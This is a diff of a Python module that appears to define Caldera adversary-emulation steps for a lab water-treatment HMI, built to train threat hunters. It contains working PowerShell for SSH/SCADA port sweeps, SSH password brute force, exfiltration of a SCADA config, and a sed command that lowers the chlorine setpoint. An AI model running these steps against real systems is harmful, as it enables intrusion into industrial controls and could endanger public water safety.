@@ -17,16 +17,22 @@ Why this scenario exists:
     on — a water-treatment HMI with confirmed compromise.
 
 The attack chain:
-    ot-01-recon       Test-NetConnection scan of 172.20.0.0/24 :22 to
-                      find the OT HMI host.
+    ot-01-recon       TcpClient probe of likely IT/OT bridge endpoints on
+                      192.168.56.0/24 (SSH 22, Modbus 502, SSH-fwd 2222,
+                      DNP3 20000, EtherNet/IP 44818). The HMI's published
+                      port at 192.168.56.10:2222 is the hit; SSH on the
+                      host and docker-host are realistic distractors.
     ot-dwell-1-foothold  Models attacker delay between recon and brute.
-    ot-02-ssh-brute   Install Posh-SSH, brute-force operator account
-                      using a small wordlist. Correct creds land after
-                      8-12 attempts → realistic auth.log signal.
-    ot-03-config-dump SSH in, exfil /etc/scada/water_treatment.conf
-                      back to C:\\Users\\Public for "exfiltration".
+    ot-02-ssh-brute   Install Posh-SSH, brute-force operator account on
+                      192.168.56.10:2222 using a small wordlist. Correct
+                      creds land at position 9 -> ~8 failed-login events
+                      plus 1 accepted-password event in the HMI's
+                      /var/log/auth.log.
+    ot-03-config-dump SSH in with known creds, exfil
+                      /etc/scada/water_treatment.conf back to
+                      C:\\Users\\Public for "exfiltration".
     ot-04-setpoint-tamper  Modify the chlorine target setpoint in the
-                      config (impact — but the lab simulator is bytes
+                      config (impact - but the lab simulator is bytes
                       only, no real ICS).
 
 The hostname `ot-hmi-water-01` and the dumped config's contents
@@ -51,8 +57,16 @@ DWELL_FOOTHOLD = int(os.environ.get("OT_DWELL_FOOTHOLD", "30"))
 
 ADVERSARY_ID = "ot-adversary-ssh-brute-waterplant-2026"
 
-# The OT HMI's network address (set in docker-compose.yml hunt_net).
-OT_TARGET = "172.20.0.60"
+# The OT HMI's reachable address from Windows agents on the host-only
+# network. The HMI container lives at 172.20.0.60 on docker_hunt_net,
+# but Windows agents at 192.168.56.0/24 cannot route to that subnet -
+# so docker-compose publishes container:22 to docker-host:2222, and the
+# attack chain reaches the HMI via the docker-host's host-only IP. In
+# real environments this mirrors an exposed port on an edge appliance
+# or jump host - exactly the kind of misconfiguration attackers use to
+# pivot from IT into OT.
+OT_TARGET = "192.168.56.10"
+OT_PORT = 2222
 OT_HOSTNAME = "ot-hmi-water-01"
 OT_USER = "operator"
 # The correct password is buried at position 9 in the wordlist so the
@@ -153,19 +167,36 @@ _wordlist_ps = ", ".join(f"'{w}'" for w in OT_PASSWORD_WORDLIST)
 # list, which the early draft tried to do.
 
 _BRUTE_CMD = (
+    # Bootstrap path for fresh win11-victim where Posh-SSH isn't yet
+    # installed. We TLS-up first because PSGallery requires TLS 1.2 and
+    # default .NET on Win11 picks SSL3/TLS1.0. NuGet provider is force-
+    # installed because Install-Module otherwise prompts interactively
+    # and the Caldera agent has no TTY. We deliberately do NOT pass
+    # -AcceptLicense / -SkipPublisherCheck - they're PSGet 2.0+ only and
+    # the shipped PSGet on Win11 stock is older.
+    "[Net.ServicePointManager]::SecurityProtocol = "
+    "  [Net.SecurityProtocolType]::Tls12; "
     "if (-not (Get-Module -ListAvailable -Name Posh-SSH)) {{ "
+    "  Set-PSRepository -Name PSGallery -InstallationPolicy Trusted "
+    "    -ErrorAction SilentlyContinue; "
+    "  Install-PackageProvider -Name NuGet -Force "
+    "    -ErrorAction SilentlyContinue | Out-Null; "
     "  Install-Module -Name Posh-SSH -Force -Scope CurrentUser "
-    "    -AcceptLicense -SkipPublisherCheck -ErrorAction SilentlyContinue "
+    "    -ErrorAction SilentlyContinue "
     "}}; "
     "Import-Module Posh-SSH -ErrorAction SilentlyContinue; "
-    "$target = '{target}'; $user = '{user}'; "
+    "if (-not (Get-Module Posh-SSH)) {{ "
+    "  Write-Output 'ERROR: Posh-SSH module unavailable - bootstrap failed'; "
+    "  exit 1 "
+    "}}; "
+    "$target = '{target}'; $port = {port}; $user = '{user}'; "
     "$wordlist = @({wordlist}); "
     "$winner = $null; "
     "foreach ($pw in $wordlist) {{ "
     "  $sec = ConvertTo-SecureString $pw -AsPlainText -Force; "
     "  $cred = New-Object System.Management.Automation.PSCredential ($user, $sec); "
     "  try {{ "
-    "    $s = New-SSHSession -ComputerName $target -Credential $cred "
+    "    $s = New-SSHSession -ComputerName $target -Port $port -Credential $cred "
     "         -AcceptKey -ConnectionTimeout 5 -ErrorAction Stop; "
     "    if ($s.Connected) {{ "
     "      Write-Output (\"SUCCESS: \" + $user + \":\" + $pw); "
@@ -180,14 +211,14 @@ _BRUTE_CMD = (
     "}}; "
     "if ($winner) {{ Write-Output (\"creds=\" + $user + \":\" + $winner) }} "
     "else        {{ Write-Output 'creds=NONE' }}"
-).format(target=OT_TARGET, user=OT_USER, wordlist=_wordlist_ps)
+).format(target=OT_TARGET, port=OT_PORT, user=OT_USER, wordlist=_wordlist_ps)
 
 _DUMP_CMD = (
     "Import-Module Posh-SSH -ErrorAction Stop; "
-    "$target = '{target}'; "
+    "$target = '{target}'; $port = {port}; "
     "$sec = ConvertTo-SecureString 'Operator123' -AsPlainText -Force; "
     "$cred = New-Object System.Management.Automation.PSCredential ('{user}', $sec); "
-    "$s = New-SSHSession -ComputerName $target -Credential $cred "
+    "$s = New-SSHSession -ComputerName $target -Port $port -Credential $cred "
     "     -AcceptKey -ConnectionTimeout 5; "
     "if (-not $s.Connected) {{ Write-Output 'ssh-failed'; exit 1 }}; "
     "$result = Invoke-SSHCommand -SessionId $s.SessionId "
@@ -197,14 +228,14 @@ _DUMP_CMD = (
     "$lines = (Get-Content '{loot}' | Measure-Object -Line).Lines; "
     "Write-Output (\"dumped: {loot} (\" + $lines + ' lines)'); "
     "Get-Content '{loot}' | Select-Object -First 6"
-).format(target=OT_TARGET, user=OT_USER, loot=LOOT_PATH)
+).format(target=OT_TARGET, port=OT_PORT, user=OT_USER, loot=LOOT_PATH)
 
 _TAMPER_CMD = (
     "Import-Module Posh-SSH -ErrorAction Stop; "
-    "$target = '{target}'; "
+    "$target = '{target}'; $port = {port}; "
     "$sec = ConvertTo-SecureString 'Operator123' -AsPlainText -Force; "
     "$cred = New-Object System.Management.Automation.PSCredential ('{user}', $sec); "
-    "$s = New-SSHSession -ComputerName $target -Credential $cred "
+    "$s = New-SSHSession -ComputerName $target -Port $port -Credential $cred "
     "     -AcceptKey -ConnectionTimeout 5; "
     "if (-not $s.Connected) {{ Write-Output 'ssh-failed'; exit 1 }}; "
     "$cmd = 'sed -i \"s|free_chlorine_target_ppm.*|free_chlorine_target_ppm = 0.40|\" "
@@ -215,31 +246,41 @@ _TAMPER_CMD = (
     "          -Command 'grep free_chlorine_target /etc/scada/water_treatment.conf'; "
     "Write-Output ('verify: ' + ($verify.Output -join '; ')); "
     "Remove-SSHSession -SessionId $s.SessionId | Out-Null"
-).format(target=OT_TARGET, user=OT_USER)
+).format(target=OT_TARGET, port=OT_PORT, user=OT_USER)
 
 
 abilities = [
     {
         "ability_id": "ot-01-recon",
-        "name": "OT: Discover SSH HMI on Docker network",
+        "name": "OT: Discover SSH HMI on IT/OT bridge",
         "description": (
-            "Probes 172.20.0.0/24 port 22 to discover the OT HMI. Mirrors what "
-            "an attacker who has compromised an IT host does first when they "
-            "begin pivoting toward operations technology — sweep for "
-            "ssh/telnet exposures on adjacent subnets."
+            "Sweeps the local /24 looking for SSH exposure on the common "
+            "IT/OT bridge ports (22, 2222) - the kind of forwarder that "
+            "sits on an edge appliance or jump host between an enterprise "
+            "subnet and a SCADA segment. The HMI's published port at "
+            "192.168.56.10:2222 lights up; pure-IT hosts on :22 are "
+            "distractors. Mirrors the pivot-discovery step an attacker "
+            "runs after landing on an IT workstation."
         ),
         "tactic": "discovery",
         "technique_name": "Network Service Discovery",
         "technique_id": "T1046",
         "executors": psh(
-            "$found = @(); "
-            "foreach ($i in 50..70) { "
-            "  $ip = '172.20.0.' + $i; "
-            "  $r = Test-NetConnection -ComputerName $ip -Port 22 "
-            "       -InformationLevel Quiet -WarningAction SilentlyContinue; "
-            "  if ($r) { $found += $ip; Write-Output (\"ssh-open: \" + $ip) } "
+            # Focused probe of likely IT/OT bridge endpoints. Common SCADA "
+            # protocol ports (Modbus 502, EtherNet/IP 44818, DNP3 20000) "
+            # plus SSH (22) and SSH-forwarder (2222) on the gateway. Uses "
+            # TcpClient with 800ms timeout so misses are sub-second.
+            "$probes = @(); "
+            "foreach ($ip in @('192.168.56.10','192.168.56.1','192.168.56.20')) { "
+            "  foreach ($p in @(22, 502, 2222, 20000, 44818)) { "
+            "    $c = New-Object System.Net.Sockets.TcpClient; "
+            "    $iar = $c.BeginConnect($ip, $p, $null, $null); "
+            "    $open = $iar.AsyncWaitHandle.WaitOne(800, $false) -and $c.Connected; "
+            "    if ($open) { Write-Output (\"open: \" + $ip + ':' + $p); $probes += ($ip + ':' + $p) } "
+            "    $c.Close(); "
+            "  } "
             "}; "
-            "Write-Output (\"summary: ssh-open count=\" + $found.Count)",
+            "Write-Output (\"summary: open count=\" + $probes.Count)",
             timeout=120,
         ),
         "requirements": [],
